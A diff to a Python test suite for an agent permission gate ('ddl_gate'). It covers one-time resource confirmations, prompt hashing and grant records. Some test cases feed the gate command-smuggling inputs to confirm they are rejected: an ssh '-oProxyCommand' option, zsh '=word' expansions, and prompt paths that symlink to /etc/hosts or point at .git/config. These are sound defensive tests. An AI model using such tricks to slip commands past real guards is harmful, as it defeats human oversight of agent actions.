@@ -122,6 +122,11 @@ mark_project(PROJECT)
 GRANTS = tempfile.mkdtemp(prefix="ddl-gate-grants-")
 atexit.register(shutil.rmtree, GRANTS, True)
 os.environ["DDL_GATE_GRANT_DIR"] = GRANTS
+# Nor may a test read the user's resource table: the default place is a disposable directory that holds none, and
+# a test that needs a table writes it into a directory of its own (ResourceTest.table).
+CONFIG = tempfile.mkdtemp(prefix="ddl-gate-config-")
+atexit.register(shutil.rmtree, CONFIG, True)
+os.environ["XDG_CONFIG_HOME"] = CONFIG
 os.chdir(str(PROJECT))
 
 
@@ -2170,7 +2175,7 @@ class GrantReportTest(GateTest):
                 self.assertEqual(out["nativeRequest"]["questions"][0][key], out["question"])
                 record = self.stored(out)
                 self.assertEqual((record["version"], record["grant"], record["projectKey"]),
-                                 (2, given, project_key(PROJECT)))
+                                 (3, given, project_key(PROJECT)))
                 core = {name: record[name] for name in ddl_gate.REPORT_CORE_KEYS}
                 self.assertLessEqual({"grant", "projectKey"}, set(core))
                 self.assertEqual(ddl_gate.review_hash(core)[:ddl_gate.ID_HEX_LENGTH], out["reportId"][2:])
@@ -2184,7 +2189,7 @@ class GrantReportTest(GateTest):
                 self.assertEqual((self.stored(plain)["grant"], self.stored(plain)["projectKey"]), (None, project_key(PROJECT)))
                 self.assertEqual(pathlib.Path(plain["report"]).read_text(encoding="utf-8"),
                                  plain["question"] + "\n\n" + detail)
-        self.assertEqual(ddl_gate.REPORT_VERSION, 2)
+        self.assertEqual(ddl_gate.REPORT_VERSION, 3)
 
     def test_line_and_block_spell_out_each_field(self):
         given = grant(paths=["tools/ddl_gate.py"], commands=[], machines=["gpu-box", "mac-mini"], handover=["dataset v2"],
@@ -2602,12 +2607,12 @@ class GrantRecordTest(GrantFlowTest):
         self.assert_no_grant()
         with mock.patch.dict(os.environ, {"DDL_GATE_STATE_DIR": self.state, "DDL_GATE_GRANT_DIR": self.grants}):
             with self.assertRaisesRegex(ValueError, "predates"):
-                ddl_gate.approved_report_grant("claude", {"session_id": "sess", "transcript_path": answered})
+                ddl_gate.approved_report("claude", {"session_id": "sess", "transcript_path": answered})
             fresh = {"session_id": "fresh", "transcript_path": answered}
-            self.assertEqual(ddl_gate.approved_report_grant("claude", fresh)["id"], prepared["reportId"][2:])
+            self.assertEqual(ddl_gate.approved_report("claude", fresh)["id"], prepared["reportId"][2:])
             with mock.patch("time.time", return_value=time.time() + 40 * 86400):  # past the grant's expiry
                 with self.assertRaisesRegex(ValueError, "not in the future"):
-                    ddl_gate.approved_report_grant("claude", fresh)
+                    ddl_gate.approved_report("claude", fresh)
 
     def test_nothing_is_recorded_for_a_typed_message(self):
         for runtime in ("claude", "codex"):
@@ -2890,7 +2895,8 @@ class GrantRecordTest(GrantFlowTest):
         self.assert_allowed(self.ask("claude", prepared))
         marker = pathlib.Path(self.state) / "sess.asked"
         (entry,) = json.loads(marker.read_text(encoding="utf-8"))
-        self.assertEqual(set(entry), {"id", "options", "grant", "toolUseId"})
+        self.assertEqual(set(entry), {"id", "options", "grant", "confirm", "toolUseId"})
+        del entry["confirm"]  # an older gate's entry: no confirmations
         marker.write_text(json.dumps(entry), encoding="utf-8")  # one bare object: the marker before it held a list
         self.assert_allowed(self.tool("claude", self.flow("claude", prepared, "answered")))
         self.assertIsNotNone(self.record(prepared))
@@ -2982,6 +2988,395 @@ class GrantRecordTest(GrantFlowTest):
             "許諾: {}（期限 {}、有効）".format(plan["reportId"], given["expires"][:10])])
 
 
+CONFIRM = [{"resource": "batch-1", "action": "run the nightly job on the cluster"}]
+PROMPT_TEXT = "List the jobs of the project.\nMake no change of any kind.\n```\nnot a fence of the report\n```\n"
+CONFIRM_LINE = {"ja": "確認: batch-1: run the nightly job on the cluster",
+                "en": "Confirm: batch-1: run the nightly job on the cluster"}
+
+
+class ConfirmationTest(GrantFlowTest):
+    """A report's confirmations for resources that ask each run: checked against the table when prepared, shown in the
+    question and the report, recorded once on the human's submitted first option of the unchanged question (the
+    grant's proof), never otherwise, and each item taken once by the run lane."""
+
+    def setUp(self):
+        super().setUp()
+        self.config = os.path.join(self.tmp, "config")
+        write_table(self.config)
+        patcher = mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": self.config})
+        patcher.start()
+        self.addCleanup(patcher.stop)
+        self.confirmations = self.store.parent / "confirmations"
+        self.prompt_file = self.root / "prompts" / "job.md"  # a service's prompt, inside the root
+        self.prompt_file.parent.mkdir()
+        self.prompt_file.write_text(PROMPT_TEXT, encoding="utf-8")
+
+    def confirmed(self, runtime, **fields):
+        fields.setdefault("grant", None)
+        fields.setdefault("confirm", CONFIRM)
+        return self.prepared(runtime, **fields)
+
+    def confirmation(self, prepared):
+        path = self.confirmations / (prepared["reportId"] + ".json")
+        return json.loads(path.read_text(encoding="utf-8")) if path.is_file() else None
+
+    def assert_no_confirmation(self):
+        self.assertFalse(self.confirmations.exists())
+        self.assertFalse((pathlib.Path(self.grants) / project_key(PROJECT) / "confirmations").exists())
+        self.assertEqual(events(self.root, kind="confirmed"), [])
+
+    def test_confirmations_join_the_question_and_the_report(self):
+        given = grant()
+        for runtime, language in (("claude", "ja"), ("codex", "en")):
+            with self.subTest(runtime=runtime):
+                out = self.confirmed(runtime, language=language)
+                lines = out["question"].split("\n")
+                self.assertEqual((len(lines), lines[5]), (6, CONFIRM_LINE[language]))
+                self.assertEqual(ddl_gate.question_id(out["question"]), ("R", out["reportId"][2:]))
+                text = pathlib.Path(out["report"]).read_text(encoding="utf-8")
+                label = ddl_gate.CONFIRM_LABELS[language]
+                self.assertTrue(text.startswith(out["question"] + "\n\n```\n{}: batch-1: {}\n```\n\n".format(
+                    label, CONFIRM[0]["action"])), text)
+                record = json.loads((pathlib.Path(out["report"]).parent / "report.json").read_text(encoding="utf-8"))
+                self.assertEqual((record["version"], record["confirm"], record["grant"]), (3, CONFIRM, None))
+                both = self.confirmed(runtime, language=language, grant=given)
+                self.assertEqual(both["question"].split("\n")[5:],
+                                 [GRANT_LINE[language].format(given["expires"][:10]), CONFIRM_LINE[language]])
+                # Four long actions: the line is cut, the report keeps each in full.
+                many = [dict({"resource": name, "action": "step {} ".format(name) + "x" * 180},
+                             **({"prompt": "prompts/job.md"} if name.startswith("svc") else {}))
+                        for name in ("batch-1", "svc-paid", "build-1", "svc")]
+                long = self.confirmed(runtime, language=language, confirm=many)
+                line = long["question"].split("\n")[5]
+                self.assertTrue(len(line.split(": ", 1)[1]) <= ddl_gate.QUESTION_LINE_LIMIT and line.endswith("…"))
+                report = pathlib.Path(long["report"]).read_text(encoding="utf-8")
+                self.assertTrue(all("{}: {}: {}".format(label, item["resource"], item["action"]) in report for item in many))
+                # The confirmations are hashed into the ID: a changed one is no prepared report.
+                path = pathlib.Path(out["report"]).parent / "report.json"
+                record["confirm"] = [{"resource": "batch-1", "action": "something else"}]
+                path.write_text(json.dumps(record), encoding="utf-8")
+                self.assert_reason(self.ask(runtime, out), ddl_gate.NOT_PREPARED.format(out["reportId"]))
+
+    def test_confirmations_are_checked_before_anything_is_written(self):
+        def refused(reason, cwd=None, hosts=("claude", "codex"), **fields):
+            for given in hosts:
+                with self.subTest(reason=reason, runtime=given, fields=fields):
+                    before = sorted(pathlib.Path(self.state).rglob("report.*"))
+                    data = dict(PrepareReportTest.BASE, **dict({"confirm": CONFIRM}, **fields))
+                    proc = self.subcommand(["prepare-report", "--runtime", given], data, cwd or self.cwd)
+                    self.assertEqual((proc.returncode, proc.stdout, proc.stderr), (2, "", "DDL STOP: " + reason + "\n"))
+                    self.assertEqual(sorted(pathlib.Path(self.state).rglob("report.*")), before)
+
+        shape = "confirm must be a list of 1 to 4 {resource, action} objects."
+        entry = ("each confirm entry is {resource, action}, and {resource, action, prompt, schema?, approve?} for a "
+                 "service.")
+        name = "confirm: a resource is a name of the resource table (lowercase letters, digits, hyphens)."
+        action = ("confirm: each action is one printable line of at most 200 characters, without surrounding spaces: "
+                  "what will run.")
+        five = [{"resource": "batch-1", "action": "run {}".format(i)} for i in range(5)]
+        for value, reason in (([], shape), (five, shape), ("batch-1", shape), ({"resource": "batch-1"}, shape),
+                              ([{"resource": "batch-1"}], entry), ([dict(CONFIRM[0], extra=1)], entry), (["batch-1"], entry),
+                              ([{"resource": "Batch_1", "action": "x"}], name), ([{"resource": 1, "action": "x"}], name),
+                              ([{"resource": "batch-1", "action": ""}], action), ([{"resource": "batch-1", "action": "a\nb"}], action),
+                              ([{"resource": "batch-1", "action": "x" * 201}], action),
+                              ([{"resource": "batch-1", "action": " run"}], action),
+                              ([{"resource": "batch-1", "action": "a\tb"}], action),
+                              ([{"resource": "batch-1", "action": 5}], action),
+                              (CONFIRM + CONFIRM, "confirm entries must differ."),
+                              ([{"resource": "nope", "action": "x"}], "confirm: `nope` is not declared in the resource table."),
+                              ([{"resource": "desk", "action": "x"}],
+                               "confirm: `desk` is not a compute resource in the resource table.")):
+            refused(reason, confirm=value)
+        refused("a report with confirmations takes one answer: its first option confirms, so multiSelect is false.",
+                hosts=("claude",), multiSelect=True)  # Codex refuses multiSelect itself
+        refused("a confirmation belongs to a DDL project; prepare the report from inside the project.", cwd=self.tmp)
+        write_table(self.config, BOX + 'note = "at 192.0.2.10"\n')
+        refused("confirm: the resource table is invalid (resource box: field note looks like an IP address (the value is "
+                "not printed)); correct it before confirming.")
+        write_table(self.config).unlink()
+        refused("confirm names resources of the resource table, and there is none.")
+
+    def test_a_service_confirmation_is_bound_to_its_prompt(self):
+        service = [{"resource": "svc-paid", "action": "list the jobs", "prompt": "prompts/job.md"}]
+        digest = hashlib.sha256(self.prompt_file.read_bytes()).hexdigest()
+        for runtime, language in (("claude", "en"), ("codex", "ja")):
+            with self.subTest(runtime=runtime):
+                prepared, session = self.confirmed(runtime, language=language, confirm=service), runtime + "-prompt"
+                self.assertEqual(prepared["question"].split("\n")[5],
+                                 CONFIRM_LINE[language].split(":")[0] + ": svc-paid: list the jobs")
+                text = pathlib.Path(prepared["report"]).read_text(encoding="utf-8")
+                head = ("svc-paid の依頼（sha256 {}）:" if language == "ja" else "Prompt for svc-paid (sha256 {}):").format(digest)
+                self.assertIn("\n\n" + head + "\n````\n" + PROMPT_TEXT + "````\n\n", text)  # whole, in a longer fence
+                stored = json.loads((pathlib.Path(prepared["report"]).parent / "report.json").read_text(encoding="utf-8"))
+                self.assertEqual(stored["confirm"], [dict(service[0], text=PROMPT_TEXT, digest=digest, approve=False)])
+                self.prompt_file.write_text("Delete every job.\n", encoding="utf-8")  # changed after preparation
+                self.assertEqual(pathlib.Path(prepared["report"]).read_text(encoding="utf-8"), text)
+                self.assert_allowed(self.approve(runtime, prepared, session=session))
+                self.assertEqual(self.confirmation(prepared)["items"],
+                                 [{"resource": "svc-paid", "action": "list the jobs", "digest": digest, "approve": False,
+                                   "used": None}])
+                with mock.patch.dict(os.environ, {"DDL_GATE_GRANT_DIR": self.grants}):
+                    path, index, item = ddl_gate.confirmation_item(str(self.root), prepared["reportId"], "svc-paid",
+                                                                   with_item=True)
+                    self.assertEqual((index, item["digest"], item["action"]), (0, digest, "list the jobs"))
+                    self.assertEqual(ddl_gate.confirmation_item(str(self.root), prepared["reportId"], "svc-paid"),
+                                     (path, 0))  # the two-value call stays
+                self.prompt_file.write_text(PROMPT_TEXT, encoding="utf-8")
+        # A prompt in a temporary directory, outside the root, is read as well; exactly 32 KiB is the most.
+        outside = pathlib.Path(self.tmp) / "prompt.txt"
+        outside.write_bytes(b"x" * (32 * 1024))
+        self.assertTrue(self.confirmed("claude", confirm=[dict(service[0], prompt=str(outside))])["reportId"])
+
+    def test_a_service_confirmation_pins_its_schema_and_whether_it_may_write(self):
+        schema = self.root / "prompts" / "answer.json"
+        schema.write_text('{"type": "object"}\n', encoding="utf-8")
+        digests = {path: hashlib.sha256(path.read_bytes()).hexdigest() for path in (self.prompt_file, schema)}
+        items = [{"resource": "svc-paid", "action": "close the stale jobs", "prompt": "prompts/job.md",
+                  "schema": "prompts/answer.json", "approve": True},
+                 {"resource": "svc-paid", "action": "list the jobs", "prompt": "prompts/job.md"}]
+        for runtime, language in (("claude", "en"), ("codex", "ja")):
+            with self.subTest(runtime=runtime):
+                prepared, session = self.confirmed(runtime, language=language, confirm=items), runtime + "-schema"
+                write = "（書き込みあり）" if language == "ja" else " (may write)"
+                sep = "、" if language == "ja" else "; "
+                self.assertEqual(prepared["question"].split("\n")[5], "{}: svc-paid: close the stale jobs{}{}svc-paid: "
+                                 "list the jobs".format(ddl_gate.CONFIRM_LABELS[language], write, sep))
+                text = pathlib.Path(prepared["report"]).read_text(encoding="utf-8")
+                label = ddl_gate.CONFIRM_LABELS[language]
+                self.assertIn("{}: svc-paid: close the stale jobs{}\n{}: svc-paid: list the jobs\n".format(label, write, label),
+                              text)
+                head = ("svc-paid の答えの形（sha256 {}）:" if language == "ja" else "Schema for svc-paid (sha256 {}):")
+                self.assertIn(head.format(digests[schema]) + '\n```\n{"type": "object"}\n```', text)
+                self.assert_allowed(self.approve(runtime, prepared, session=session))
+                self.assertEqual(self.confirmation(prepared)["items"],
+                                 [{"resource": "svc-paid", "action": "close the stale jobs", "digest": digests[self.prompt_file],
+                                   "schemaDigest": digests[schema], "approve": True, "used": None},
+                                  {"resource": "svc-paid", "action": "list the jobs", "digest": digests[self.prompt_file],
+                                   "approve": False, "used": None}])
+                # Every unused item of the resource, so the run lane can compare each with what it will run.
+                with mock.patch.dict(os.environ, {"DDL_GATE_GRANT_DIR": self.grants}):
+                    found = ddl_gate.confirmation_items(str(self.root), prepared["reportId"], "svc-paid")
+                    self.assertEqual([(index, item["action"], item["approve"]) for _, index, item in found],
+                                     [(0, "close the stale jobs", True), (1, "list the jobs", False)])
+                    ddl_gate.mark_confirmation_used(found[1][0], 1)
+                    self.assertEqual([index for _, index, _ in ddl_gate.confirmation_items(
+                        str(self.root), prepared["reportId"], "svc-paid")], [0])
+                    self.assertEqual(ddl_gate.confirmation_item(str(self.root), prepared["reportId"], "svc-paid")[1], 0)
+                    ddl_gate.mark_confirmation_used(found[0][0], 0)
+                    with self.assertRaisesRegex(ValueError, "used already"):
+                        ddl_gate.confirmation_items(str(self.root), prepared["reportId"], "svc-paid")
+                    with self.assertRaisesRegex(ValueError, "does not name"):
+                        ddl_gate.confirmation_items(str(self.root), prepared["reportId"], "svc")
+                    with self.assertRaisesRegex(ValueError, "R- and 16"):
+                        ddl_gate.confirmation_items(str(self.root), "G-" + prepared["reportId"][2:], "svc-paid")
+
+    def test_a_service_confirmation_without_a_good_prompt_is_refused(self):
+        def refused(reason, confirm):
+            for runtime in ("claude", "codex"):
+                with self.subTest(reason=reason, runtime=runtime, confirm=confirm):
+                    before = sorted(pathlib.Path(self.state).rglob("report.*"))
+                    proc = self.subcommand(["prepare-report", "--runtime", runtime],
+                                           dict(PrepareReportTest.BASE, confirm=confirm), self.cwd)
+                    self.assertEqual((proc.returncode, proc.stdout, proc.stderr), (2, "", "DDL STOP: " + reason + "\n"))
+                    self.assertEqual(sorted(pathlib.Path(self.state).rglob("report.*")), before)
+
+        def item(resource="svc", **changes):
+            return [dict({"resource": resource, "action": "list the jobs", "prompt": "prompts/job.md"}, **changes)]
+
+        place = ("confirm: a prompt file lies inside the project, outside its protected places, or in a temporary "
+                 "directory.")
+        refused("confirm: `svc` is a service: its entry names the prompt it sends (prompt: a file).",
+                [{"resource": "svc", "action": "list the jobs"}])
+        refused("confirm: `batch-1` is reached by ssh: its action is the exact command, and it takes no prompt.",
+                item("batch-1"))
+        (self.root / ".claude" / "settings.json").write_text("{}")
+        (self.root / "big.md").write_bytes(b"x" * (32 * 1024 + 1))
+        (self.root / "latin.md").write_bytes(b"caf\xe9\n")
+        os.symlink("/etc/hosts", str(self.root / "hosts.md"))
+        for prompt, reason in ((".claude/settings.json", place), (".git/config", place), ("/etc/hosts", place),
+                               ("hosts.md", place), (".ddl/events.jsonl", place), ("../outside.md", None),
+                               ("big.md", "confirm: the prompt file holds more than 32 KiB."),
+                               ("prompts", "confirm: the prompt file is not a regular file."),
+                               ("missing.md", "confirm: the prompt file cannot be read."),
+                               ("latin.md", "confirm: a prompt file is UTF-8 text."),
+                               ("", "confirm: a prompt is the path of a file."),
+                               ("a\nb", "confirm: a prompt is the path of a file.")):
+            if reason is None:  # beside the root, in the temporary directory: read, so only a missing file fails
+                reason = "confirm: the prompt file cannot be read."
+            refused(reason, item(prompt=prompt))
+        entry = ("each confirm entry is {resource, action}, and {resource, action, prompt, schema?, approve?} for a "
+                 "service.")
+        for changes in ({"digest": "0" * 64}, {"schemaDigest": "0" * 64}, {"text": "x"}):  # the gate computes these
+            refused(entry, item(**changes))
+        refused(entry, [{"resource": "svc", "action": "x", "schema": "prompts/job.md"}])  # no prompt
+        refused(entry, [{"resource": "batch-1", "action": "make", "approve": True}])
+        refused("confirm: `batch-1` is reached by ssh: its action is the exact command, and it takes no prompt.",
+                item("batch-1", approve=False))
+        for value in ("yes", 1, None):
+            refused("confirm: approve is true or false.", item(approve=value))
+        schema_place = place.replace("a prompt file", "a schema file")
+        for schema, reason in ((".claude/settings.json", schema_place), ("/etc/hosts", schema_place),
+                               ("big.md", "confirm: the schema file holds more than 32 KiB."),
+                               ("prompts", "confirm: the schema file is not a regular file."),
+                               ("missing.json", "confirm: the schema file cannot be read."),
+                               ("latin.md", "confirm: a schema file is UTF-8 text."), ("", "confirm: a schema is the path of a file.")):
+            refused(reason, item(schema=schema))
+
+    def test_the_first_option_records_the_confirmations_on_both_hosts(self):
+        for runtime in ("claude", "codex"):
+            with self.subTest(runtime=runtime):
+                prepared, session = self.confirmed(runtime), runtime + "-confirm"
+                ident = prepared["reportId"]
+                self.assert_allowed(self.ask(runtime, prepared, session))
+                self.assertIsNone(self.confirmation(prepared))  # asking records nothing
+                if runtime == "codex":
+                    self.assert_allowed(self.reply(prepared, 0, session))
+                    self.assertIsNone(self.confirmation(prepared))  # nor does the reply: the proof reads the record
+                self.assert_allowed(self.tool(runtime, self.flow(runtime, prepared, "answered"), session))
+                record = self.confirmation(prepared)
+                self.assertEqual(set(record), {"id", "projectKey", "root", "items", "approvedAt", "session", "host"})
+                self.assertEqual({key: record[key] for key in ("id", "projectKey", "root", "items", "session", "host")},
+                                 {"id": ident, "projectKey": project_key(self.root), "root": os.path.realpath(self.root),
+                                  "items": [dict(CONFIRM[0], used=None)], "session": session, "host": runtime})
+                self.assertRegex(record["approvedAt"], ISO_UTC)
+                path = self.confirmations / (ident + ".json")
+                self.assertEqual(path.stat().st_mode & 0o777, 0o600)
+                self.assertEqual(self.confirmations.stat().st_mode & 0o777, 0o700)
+                self.assertEqual([entry.name for entry in self.store.parent.iterdir()], ["confirmations"])  # no grant
+                self.assertEqual([(row["kind"], row.get("id")) for row in events(self.root, session=session)],
+                                 [("asked", ident), ("answered", ident), ("confirmed", ident)])
+                self.assertFalse(self.armed(session))
+                before = path.read_bytes()
+                self.assert_allowed(self.stop(runtime, self.flow(runtime, prepared, "answered"), session))
+                self.assertEqual(path.read_bytes(), before)  # written once
+
+    def test_a_report_with_a_grant_and_confirmations_records_both_and_stop_records_too(self):
+        for runtime in ("claude", "codex"):
+            with self.subTest(runtime=runtime):
+                prepared, session = self.confirmed(runtime, grant=grant()), runtime + "-both"
+                self.assert_allowed(self.approve(runtime, prepared, session=session))
+                self.assertTrue(self.record(prepared) and self.confirmation(prepared))
+                self.assertEqual([row["kind"] for row in events(self.root, session=session)][-2:], ["granted", "confirmed"])
+                late, session = self.confirmed(runtime), runtime + "-stop"
+                self.assert_allowed(self.ask(runtime, late, session))
+                if runtime == "codex":
+                    self.assert_allowed(self.reply(late, 0, session))
+                self.assert_allowed(self.stop(runtime, self.flow(runtime, late, "answered"), session))
+                self.assertEqual(self.confirmation(late)["session"], session)
+
+    def test_nothing_is_recorded_unless_the_first_option_is_submitted(self):
+        for runtime in ("claude", "codex"):
+            with self.subTest(runtime=runtime, case="unanswered"):
+                prepared, session = self.confirmed(runtime), runtime + "-unanswered"
+                self.assert_allowed(self.ask(runtime, prepared, session))
+                asked = self.flow(runtime, prepared, "asked")
+                self.tool(runtime, asked, session)
+                self.assert_allowed(self.stop(runtime, asked, session))
+                self.assert_no_confirmation()
+            for answer in (1, 2):  # another option, or declining
+                with self.subTest(runtime=runtime, answer=answer):
+                    prepared, session = self.confirmed(runtime), "{}-option-{}".format(runtime, answer)
+                    self.assert_allowed(self.approve(runtime, prepared, answer, session))
+                    self.assert_allowed(self.stop(runtime, self.flow(runtime, prepared, "answered", answer), session))
+                    self.assert_no_confirmation()
+            with self.subTest(runtime=runtime, case="typed"):
+                prepared, session = self.confirmed(runtime), runtime + "-typed"
+                typed = (user("OK, confirmed.", **HUMAN_ORIGIN) if runtime == "claude" else
+                         {"type": "event_msg", "payload": {"type": "item_completed", "item": {
+                             "type": "UserMessage", "content": [{"type": "text", "text": "OK, confirmed."}]}}})
+                transcript = self.flow(runtime, prepared, "asked", mutate=lambda rows: rows.append(typed))
+                self.assert_allowed(self.ask(runtime, prepared, session))
+                self.assert_allowed(self.prompt(runtime, transcript, "OK, confirmed.", session))
+                self.assert_allowed(self.tool(runtime, transcript, session))
+                late = self.flow(runtime, prepared, "answered", mutate=lambda rows: rows.append(typed))
+                self.assert_allowed(self.tool(runtime, late, session))
+                self.assert_allowed(self.stop(runtime, late, session))
+                self.assert_no_confirmation()
+            with self.subTest(runtime=runtime, case="another project"):
+                foreign, session = self.prepare_report(runtime, confirm=CONFIRM), runtime + "-foreign"
+                self.assert_allowed(self.approve(runtime, foreign, session=session))
+                self.assert_allowed(self.stop(runtime, self.flow(runtime, foreign, "answered"), session))
+                self.assert_no_confirmation()
+
+        def timed_out(rows):
+            rows[4]["toolUseResult"]["afkTimeoutMs"] = 60000  # the host submitted the selection after the idle wait
+
+        prepared = self.confirmed("claude")
+        self.approve("claude", prepared, session="timeout", mutate=timed_out)
+        self.assert_allowed(self.stop("claude", self.flow("claude", prepared, "answered", mutate=timed_out), "timeout"))
+        self.assert_no_confirmation()
+
+    def test_an_item_is_taken_once(self):
+        root, key, store = os.path.realpath(self.root), project_key(self.root), ddl_gate.store_confirmation
+
+        def body(ident, *resources):
+            return {"id": ident, "projectKey": key, "root": root, "approvedAt": "2026-11-24T00:00:00.000Z",
+                    "items": [{"resource": name, "action": "run {}".format(i), "used": None}
+                              for i, name in enumerate(resources)], "session": "s", "host": "claude"}
+
+        ident = "R-" + "d" * 16
+        with mock.patch.dict(os.environ, {"DDL_GATE_GRANT_DIR": self.grants}):
+            self.assertIs(store(body(ident, "batch-1", "svc-paid", "batch-1")), True)
+            path = str(self.confirmations / (ident + ".json"))
+            self.assertEqual(ddl_gate.confirmation_item(str(self.root), ident, "batch-1"), (path, 0))
+            self.assertRegex(ddl_gate.mark_confirmation_used(path, 0), ISO_UTC)
+            self.assertEqual(oct(os.stat(path).st_mode & 0o777), oct(0o600))
+            self.assertEqual(ddl_gate.confirmation_item(str(self.root), ident, "batch-1"), (path, 2))
+            self.assertEqual(ddl_gate.confirmation_item(str(self.root), ident, "svc-paid"), (path, 1))
+            ddl_gate.mark_confirmation_used(path, 2)
+            with self.assertRaisesRegex(ValueError, "used already"):
+                ddl_gate.confirmation_item(str(self.root), ident, "batch-1")
+            with self.assertRaisesRegex(ValueError, "used already"):
+                ddl_gate.mark_confirmation_used(path, 0)
+            self.assertIs(store(body(ident, "batch-1", "svc-paid", "batch-1")), False)  # a later recording resets nothing
+            items = json.loads(pathlib.Path(path).read_text(encoding="utf-8"))["items"]
+            self.assertEqual([item["used"] is None for item in items], [False, True, False])
+            self.assertEqual(sorted(name for name in os.listdir(str(self.confirmations))), [ident + ".json", ident + ".json.lock"])
+            for args, message in (((str(self.root), ident, "svc"), "does not name"),
+                                  ((str(self.root), "G-" + "d" * 16, "batch-1"), "R- and 16"),
+                                  ((str(self.root), "R-xyz", "batch-1"), "R- and 16"), ((str(self.root), None, "batch-1"), "R- and 16"),
+                                  ((str(self.root), "R-" + "e" * 16, "batch-1"), "no confirmation"),
+                                  ((str(self.tmp), ident, "batch-1"), "no confirmation"), ((None, ident, "batch-1"), "DDL project")):
+                with self.subTest(args=args), self.assertRaisesRegex(ValueError, message):
+                    ddl_gate.confirmation_item(*args)
+            for index in (3, -1, True, "0", None):
+                with self.subTest(index=index), self.assertRaisesRegex(ValueError, "no such"):
+                    ddl_gate.mark_confirmation_used(path, index)
+            with self.assertRaisesRegex(ValueError, "no such"):
+                ddl_gate.mark_confirmation_used(str(self.confirmations / ("R-" + "e" * 16 + ".json")), 0)
+            # Eight runs reach for one item at once: one takes it.
+            other = "R-" + "f" * 16
+            store(body(other, "svc-paid"))
+            taken, path = [], str(self.confirmations / (other + ".json"))
+
+            def take():
+                try:
+                    taken.append(ddl_gate.mark_confirmation_used(path, 0))
+                except ValueError:
+                    taken.append(None)
+
+            import threading
+            threads = [threading.Thread(target=take) for _ in range(8)]
+            for thread in threads:
+                thread.start()
+            for thread in threads:
+                thread.join()
+            self.assertEqual(len([stamp for stamp in taken if stamp]), 1, taken)
+            self.assertEqual(json.loads(pathlib.Path(path).read_text(encoding="utf-8"))["items"][0]["used"],
+                             next(stamp for stamp in taken if stamp))
+
+    def test_the_hook_leaves_a_confirmed_call_to_the_host(self):
+        for runtime in ("claude", "codex"):
+            for command in ("remote batch-1 --confirmed R-{0} -- make", "remote build-1 --confirmed R-{0} -- make",
+                            "service svc-paid --prompt-file tools/p.md --confirmed R-{0}",
+                            "service svc --prompt-file tools/p.md --approve"):
+                with self.subTest(runtime=runtime, command=command):
+                    tool, key = SHELL[runtime]
+                    proc = self.call(runtime, fixture(runtime + "_open.jsonl"), tool,
+                                     {key: GATE_CALL + " " + command.format("d" * 16)}, cwd=self.cwd)
+                    self.assertEqual(proc.stdout, "")
+
+
 class GrantStoreTest(GrantFlowTest):
     """Where the grant store lives: DDL_GATE_GRANT_DIR, else XDG_STATE_HOME/ddl-gate, else HOME/.local/state/ddl-gate."""
 
@@ -3034,12 +3429,9 @@ PATCH = "*** Begin Patch\n{}*** End Patch"
 ALLOW_PERMISSION = {"hookSpecificOutput": {"hookEventName": "PermissionRequest", "decision": {"behavior": "allow"}}}
 
 
-class GrantAnswerTest(GrantFlowTest):
-    """What an active grant answers (the protocol's Run Operation step 1 and Formats): an allow inside it, a deny
-    outside it, the host's own decision for everything else; never under a pending STOP, and nothing without it.
-
-    Claude reads the allow from PreToolUse; Codex takes none there, so its PermissionRequest gives the same answer.
-    Each check runs on both hosts, and a Codex call that PreToolUse denies gets nothing from PermissionRequest."""
+class GrantAnswers(GrantFlowTest):
+    """A project with a few files, grant records written straight into the store, and the gate's answer to one call
+    on both hosts. It holds no test: GrantAnswerTest and ResourceAnswerTest do."""
 
     def setUp(self):
         super().setUp()
@@ -3120,6 +3512,14 @@ class GrantAnswerTest(GrantFlowTest):
 
     def allow(self, ident, kind):
         return "allow", ddl_gate.GRANT_ALLOW.format(ident, kind)
+
+
+class GrantAnswerTest(GrantAnswers):
+    """What an active grant answers (the protocol's Run Operation step 1 and Formats): an allow inside it, a deny
+    outside it, the host's own decision for everything else; never under a pending STOP, and nothing without it.
+
+    Claude reads the allow from PreToolUse; Codex takes none there, so its PermissionRequest gives the same answer.
+    Each check runs on both hosts, and a Codex call that PreToolUse denies gets nothing from PermissionRequest."""
 
     def test_the_launcher_gives_the_same_answers_as_the_code_it_loads(self):
         """The rest of this class calls the gate in process; the hook runs ddl_gate.py. Both answer alike."""
@@ -3267,7 +3667,7 @@ class GrantAnswerTest(GrantFlowTest):
         self.expect(lambda rt: self.shell(rt, snapshot), self.allow(other, "snapshot"))
         inside = snapshot + " --git-dir .notebook.git --work-tree=."
         self.expect(lambda rt: self.shell(rt, inside), self.allow(other, "snapshot"))
-        for pair in (" --git-dir=/tmp/other/.git --work-tree=/tmp/other", " --git-dir .git --work-tree " + str(self.outside),
+        for pair in (" --git-dir=/tmp/other/.git --work-tree=/tmp/other", " --git-dir .git --work-tree " + shlex.quote(str(self.outside)),
                      " --git-dir ../outside/.git --work-tree ."):
             self.expect(lambda rt, c=snapshot + pair: self.shell(rt, c), None)  # both inside the root, or the host's
 
@@ -3661,12 +4061,532 @@ class GrantMatchTest(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertEqual(ddl_gate.segment_class(shlex.split(command), gate.__contains__), expected)
 
+    def test_a_word_that_starts_with_equals_is_not_literal(self):
+        for command in ("ls =python3", "=ls", "cat =x", "service svc --prompt-file =python3", "echo a==b", "x &&=ls",
+                        "a;=b", "a|=b", "echo x\n=ls", "make X==ls", "echo\t=x"):
+            with self.subTest(command=command):
+                self.assertFalse(ddl_gate.literal_shell(command))
+                self.assertFalse(ddl_gate.shell_is_read_only(command)[0])
+        for command in ("make X=1", "python3 run.py --out=x", "git log --format=%H", "echo '=x'", 'echo "=x"', "echo \\=x",
+                        "a=b c=d make"):
+            with self.subTest(command=command):
+                self.assertTrue(ddl_gate.literal_shell(command))
+
     def test_a_remote_command_is_literal_words_after_the_machine(self):
         for command, expected in (("ssh -T -n box make test", ("box", ["make", "test"])), ("ssh box", None),
                                   ("ssh box -oProxyCommand=x true", None), ("ssh -p 22 box ls", None),
                                   ("ssh -o ConnectTimeout=5 box ls", ("box", ["ls"]))):
             with self.subTest(command=command):
                 self.assertEqual(ddl_gate.ssh_form(shlex.split(command)), expected)
+
+
+RESOURCES = FIXTURES / "resources_valid.toml"  # generic names: desk, build-1, gpu-1, batch-1, svc, svc-paid
+GATE_CALL = "python3 " + shlex.quote(GATE)
+# A compute resource that ssh reaches and that takes code: the start of a valid table for one problem more.
+BOX = '[box]\nroles = ["compute"]\nreach = "ssh:box"\ndata = ["code"]\n'
+
+
+def write_table(config, text=None):
